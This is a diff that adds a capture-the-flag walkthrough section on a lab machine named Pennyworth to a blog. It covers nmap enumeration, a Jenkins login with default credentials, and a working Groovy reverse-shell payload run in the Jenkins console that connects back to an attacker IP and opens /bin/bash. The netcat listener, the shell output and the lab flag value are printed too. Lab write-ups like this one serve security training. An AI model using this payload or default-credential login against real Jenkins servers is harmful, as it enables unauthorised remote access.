@@ -21,7 +21,7 @@ In this blog, I will perform an analysis of each level and give a walkthrough fo
  4. ✓ [Level 4: Responder](#level-4-responder) 
  5. ✓ [Level 5: Ignition](#level-5-ignition) 
  6. ✓ [Level 6: Bike](#level-6-bike) 
- 7. ✗ [Level 7: Pennyworth](#level-6-pennyworth) 
+ 7. ✓ [Level 7: Pennyworth](#level-6-pennyworth) 
  8. ✗ [Level 8: Tactics](#level-6-tactics) 
 
 
@@ -2727,4 +2727,198 @@ Therefore, we now execute out final command to grab our twelfth flag!
 
 Using nmap, we were able to discover the host had a web server open on port 80. We then analyzed the input field, and realized it was open to a server side template injection exploit. Finally using Burpe Suite, we were able to inject the correct payload for the handlebar library vulnerability that gave us server side execution.
 
+[Table of Contents](#table-of-contents) 
+
+## Level 7: Pennyworth
+
+### Scope
+
+The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:
+
+| # | 	Description 	| Value |
+| :-----------: | :-----------: | :-----------: |
+| 1 | 	IP Address   |    	10.129.6.198 | 
+
+### Enumeration
+
+Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.
+
+First we can try to see if we can make contact with the machine with a ping request.
+
+```
+ping {ip address}
+```
+The results from the ping are:
+
+```
+└─$ ping 10.129.6.198  
+                         
+PING 10.129.6.198 (10.129.6.198) 56(84) bytes of data.
+64 bytes from 10.129.6.198: icmp_seq=1 ttl=63 time=8.47 ms
+64 bytes from 10.129.6.198: icmp_seq=2 ttl=63 time=7.36 ms
+64 bytes from 10.129.6.198: icmp_seq=3 ttl=63 time=13.5 ms
+64 bytes from 10.129.6.198: icmp_seq=4 ttl=63 time=11.6 ms
+^C
+--- 10.129.6.198 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+rtt min/avg/max/mdev = 7.356/10.223/13.451/2.432 ms
+
+```
+As we can see, we made a connection with the host. 
+
+Next, we can try using nmap to see if there are any ports that can be exploited.
+
+```
+nmap -p- --min-rate 3000 -sC -sV {ip address}
+```
+
+Where:
+
+```
+-p-: scans ALL ports
+--min-rate <number>: Send packets no slower than <number> per second
+-sC: equivalent to --script=default
+-sV: Probe open ports to determine service/version info
+```
+The results of nmap are:
+
+```
+└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.6.198
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-26 14:43 EDT
+Nmap scan report for 10.129.6.198
+Host is up (0.0098s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Jetty 9.4.39.v20210325
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+|_http-server-header: Jetty(9.4.39.v20210325)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
+
+```
+
+Our scan reveals one port of interest; port 8080 (Web Server).
+
+The first thing we can try is to browse the website for clues.
+
+![Screenshot_2022-07-26_15_45_24](https://user-images.githubusercontent.com/59018247/181098868-adeb8363-a204-4427-a1a2-b3a4c7f8c304.png)
+
+
+We can see here that this is a very basic website that contains a login for Jenkins. A quick google search on Jenkins reveals:
+
+> The leading open source automation server, Jenkins provides hundreds of plugins to support building, deploying and automating any project. 
+
+> Jenkins offers a simple way to set up a continuous integration or continuous delivery (CI/CD) environment for almost any combination of languages and source code repositories using pipelines, as well as automating other routine development tasks. While Jenkins doesn’t eliminate the need to create scripts for individual steps, it does give you a faster and more robust way to integrate your entire chain of build, test, and deployment tools than you can easily build yourself.
+
+Another google search reveals that if left unconfigured, a default username and password combination is root/password:
+
+
+![Screenshot_2022-07-26_15_50_39](https://user-images.githubusercontent.com/59018247/181099766-49f41172-f2f4-4654-b6c8-5df1cde486de.png)
+
+Using that combination grants us internal access to the dashboard. In doing some snooping we notice that that Jenkins version is 2.289.1. 
+
+In doing some more online searching, we find it is possible to perform a [reverse shell exploit](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy) while given access to the console!
+
+Heading to the console page:
+
+![Screenshot_2022-07-26_15_54_14](https://user-images.githubusercontent.com/59018247/181100382-ebe35744-513e-4fec-98e6-a168cfee8218.png)
+
+We can try the reverse shell payload:
+
+```
+String host="{ip address}";
+int port=4242;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+First we need to run netcat in listening mode:
+
+```
+└─$ nc -lvnp 4242
+
+listening on [any] 4242 ...
+
+```
+Then while executing the groovy script, we unexpectadly recieve a large error message:
+
+
+![Screenshot_2022-07-26_15_58_29](https://user-images.githubusercontent.com/59018247/181101248-109a9f1b-a26f-4790-954d-fba7f897de3f.png)
+
+We can see the main error:
+
+```
+Cannot run program "cmd.exe": error=2, No such file or directory
+```
+
+If the machine does not understand "cmd.exe", we can conclude here that we are not dealing with a Windows server. Therefore, we can modify the payload we have to instead work with linux:
+
+```
+String host="10.10.14.112";
+int port=4242;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+Re- running the script we notice in the terminal we have shell access!
+
+```
+ls
+
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+```
+
+```
+cd root
+
+ls
+flag.txt
+snap
+
+cat flag.txt
+
+9cdfb439c7876e703e307864c9167a15
+```
+We can now grab our thirteenth flag!
+
+## Conclusions - Level 7 Pennyworth
+
+| # | 	Tools 	| Description |
+| :-----------: | :-----------: | :-----------: |
+| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
+| 2 | 	netcat  |    Netcat is a computer networking utility for reading from and writing to network connections using TCP or UDP. | 
+
+| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
+| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
+| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
+
+Using nmap, we were able to discover the host had a web server open on port 8080. We then we able to brute force the login credentials using the default Jenkins username/password. Finally, we were able to perform a reverse shell exploit using a groovy script inside the web console in order to get root access to the machine.
+ 
 [Table of Contents](#table-of-contents) 
